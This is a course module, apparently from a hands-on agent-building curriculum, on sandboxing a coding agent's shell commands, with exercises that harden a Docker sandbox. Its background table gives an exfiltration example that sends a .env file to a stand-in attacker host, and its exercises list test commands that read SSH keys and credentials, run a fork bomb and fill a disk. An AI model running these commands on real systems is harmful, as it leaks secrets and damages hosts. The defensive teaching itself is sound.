# E3: Sandbox internals

**After** Node 03 (the coding agent's sandbox) and Node 13 (permissions). **Estimate** 1 day. **Cost** $0: no model
calls needed (you play the misbehaving agent yourself).

## Why
Node 03 ran shopdev's shell commands in a `LocalSandbox` (a working directory and a timeout) or a `DockerSandbox`.
Node 13 put a permission gate in front. This elective looks underneath: what each layer actually stops, what it
doesn't, and what production agent sandboxes add. A gate decides *whether* a command runs; a sandbox decides *what
it can touch* when the gate is wrong.

## Background
A process can hurt you through five doors; each sandbox technology closes some of them:
| Door | Example | Closed by |
|---|---|---|
| Files | read `~/.ssh/id_ed25519`, write outside the workspace | mount namespaces, read-only bind mounts, Landlock, macOS Seatbelt profiles |
| Network | `curl -d @.env attacker.example` | a network namespace with no interfaces, or an egress proxy with an allowlist |
| Processes and kernel | fork bomb, `ptrace` another process, kernel exploits | PID namespaces, cgroups limits, seccomp syscall filters; gVisor (a user-space kernel); microVMs (Firecracker, Kata) |
| Credentials | environment variables, cloud metadata endpoints (`169.254.169.254`) | a clean environment, no metadata route, short-lived scoped tokens (Node 13) |
| Resources | fill the disk, eat all memory or CPU | cgroups, disk quotas, timeouts |

Containers share the host kernel: good isolation for honest mistakes, weaker against a determined attacker than
gVisor or a microVM. Coding agents increasingly ship OS-level sandboxes for their own shell tools (on Linux typically
bubblewrap plus a network proxy, on macOS Seatbelt); read your agent's docs to see which doors it closes by default.

## Exercises
1. **[PREDICT]** For each command below, predict the outcome under shopdev's `LocalSandbox` and under `DockerSandbox`
   (read `agentlab/shopdev/sandbox.py` first): `cat ~/.ssh/*` · `cat ../../.env` · `env | grep KEY` ·
   `curl -s https://example.com` · `python -c "open('/tmp/x','w').write('x')"` · `:(){ :|:& };:` (run it only
   inside a container with a pids limit!) · `dd if=/dev/zero of=big bs=1M count=5000` ·
   `curl -s 169.254.169.254` (on a cloud VM).
2. **Run them** through each sandbox (`make_sandbox(...)`, as the agent would). **[LOG]** a table of what got through.
3. **Close the doors.** Harden the Docker sandbox: `--network none` (or an egress proxy allowing only the package
   index), `--read-only` with a writable workspace mount, `--pids-limit`, `--memory`, `--cpus`, a non-root user,
   `--cap-drop ALL`, `--security-opt no-new-privileges`, a clean environment. Re-run the table. Which commands
   still work that the agent legitimately needs (installing a package? running tests?), and how do you allow just
   those?
4. **One step further** (Linux): run a command under `bwrap` (bubblewrap) with only the workspace mounted and no
   network, or install gVisor's `runsc` as a Docker runtime and compare. **[LOG]** the overhead on running
   Shopfront's test suite.
5. **[DECIDE]** For shopdev and for the overnight ops agent (Node 13), which sandbox, which doors closed, which
   exceptions, and what the permission gate is still for once the sandbox exists.

## Check before relying on this
Your coding agents' current sandboxing docs (Claude Code, OpenCode); Docker's security options for your version;
gVisor and Firecracker platform support.
- https://docs.docker.com/engine/security/ · https://gvisor.dev/docs/ · https://github.com/containers/bubblewrap
- https://code.claude.com/docs/en/sandboxing
